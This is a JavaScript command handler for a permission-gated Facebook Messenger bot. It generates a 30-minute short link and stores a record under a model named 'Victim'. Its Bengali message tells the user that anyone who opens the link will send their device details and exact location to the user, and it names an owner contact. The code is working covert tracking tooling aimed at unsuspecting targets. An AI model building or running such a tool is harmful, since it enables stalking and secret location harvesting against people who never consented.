const { nanoid } = require('nanoid');
const Victim = require('../models/Victim');
const User = require('../models/User');
const { getConfig, sendMessage, shortenUrl } = require('../utils/helpers');

module.exports = {
    execute: async (senderId, args, sendMessage) => {
        try {
            const user = await User.findOne({ fbId: senderId });
            if (!user || !user.allowed) {
                await sendMessage(senderId, '⛔ আপনার পারমিশন নেই। অ্যাডমিনের সাথে যোগাযোগ করুন।');
                return;
            }
            if (user.permissionExpiresAt && new Date() > user.permissionExpiresAt) {
                user.allowed = false;
                await user.save();
                await sendMessage(senderId, '⛔ আপনার পারমিশন এক্সপায়ার হয়ে গেছে। অ্যাডমিনের সাথে যোগাযোগ করুন।');
                return;
            }

            const config = await getConfig();
            const baseUrl = config.baseUrl || 'http://localhost:3000';

            const id = nanoid(10);
            const longLink = `${baseUrl}/l/${id}`;
            const shortLink = await shortenUrl(longLink);

            const expiresAt = new Date();
            expiresAt.setMinutes(expiresAt.getMinutes() + 30);

            const victim = new Victim({
                id: id,
                fbId: senderId,
                type: 'location',
                shortLink: shortLink || longLink,
                timestamp: new Date(),
                expiresAt: expiresAt,
                status: 'pending'
            });
            await victim.save();

            const msg = `📍 লোকেশন লিংক সফলভাবে তৈরি হয়েছে! 🎉

🔗 আপনার লিংক: ${longLink}
⏰ লিংকটি ৩০ মিনিটের জন্য বৈধ থাকবে।

📌 কাজ করার নিয়ম:
কেউ লিঙ্কে প্রবেশ করলে তার ডিভাইসের তথ্য এবং তার সঠিক লোকেশন আপনার কাছে চলে আসবে। 💯
━━━━━━━━━━━━━━━━━━━━
🔗 Owner: m.me/2ndJohnnySins`;

            await sendMessage(senderId, msg);
        } catch (err) {
            console.error('❌ Location command error:', err);
            await sendMessage(senderId, '❌ লিংক তৈরি করতে ব্যর্থ: ' + err.message);
        }
    }
};